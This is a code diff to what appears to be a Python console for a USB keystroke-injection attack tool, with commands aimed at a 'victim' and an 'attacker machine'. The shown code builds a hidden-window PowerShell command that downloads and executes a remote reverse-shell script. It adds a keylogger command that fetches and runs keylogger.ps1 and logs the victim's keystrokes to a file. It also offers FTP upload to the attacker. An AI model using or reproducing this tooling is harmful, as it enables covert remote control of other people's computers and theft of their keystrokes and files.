@@ -125,6 +125,7 @@ while not stop:
             print("                     -q           Close FTP server on attacker machine")
             print("ducky/upload         \"filename\"   Upload a file to attacker machine using FTP")
             print("ducky/rickroll       N/A          Prank the victim with a rickroll")
+            print("ducky/keylogger      \"timeout\"    Execute a keylogger, leave blank for indefinite")
             stdin = ""
         elif ducky_command[:4] == "quit":
             options = [x for x in ducky_command.split(" ")[1:] if x]
@@ -181,7 +182,7 @@ while not stop:
             if input_attacker_ip.lower() == "localhost" or input_attacker_ip == "127.0.0.1":
                 input_attacker_ip = attacker_ip
             commands = []
-            commands.append("start-process powershell -argument \'-windowstyle hidden -command $ip=\\\"" + input_attacker_ip + "\\\"; $port=" + input_attacker_port + "; iex (invoke-webrequest raw.githubusercontent.com/computer-geek64/ducky/master/reverse_shell).content\'")
+            commands.append("start-process powershell -argument \'-windowstyle hidden -command $ip=\\\"" + input_attacker_ip + "\\\"; $port=" + input_attacker_port + "; iex (invoke-webrequest raw.githubusercontent.com/computer-geek64/ducky/master/reverse_shell.ps1).content\'")
             stdin = "; ".join(commands)
         elif ducky_command[:3] == "ftp":
             options = [x for x in ducky_command.split(" ")[1:] if x]
@@ -208,6 +209,16 @@ while not stop:
             commands.append("cd \"C:/Program Files (x86)/Google/Chrome/Application\"")
             commands.append("./chrome.exe https://www.youtube.com/watch?v=oHg5SJYRHA0")
             stdin = "; ".join(commands)
+        elif ducky_command[:9] == "keylogger":
+            options = [x for x in ducky_command.split(" ")[1:] if x]
+            commands = []
+            commands.append("iex ds \"https://raw.githubusercontent.com/computer-geek64/ducky/master/keylogger.ps1\"")
+            if len(options) > 0:
+                commands.append("get-keystrokes -timeout " + options[0] + " -logpath $env:userprofile\\Documents\\key.log")
+            else:
+                commands.append("get-keystrokes -logpath $env:userprofile\\Documents\\key.log")
+            stdin = "; ".join(commands)
+
         else:
             print("Ducky command not recognized: \"" + ducky_command + "\"")
             stdin = ""
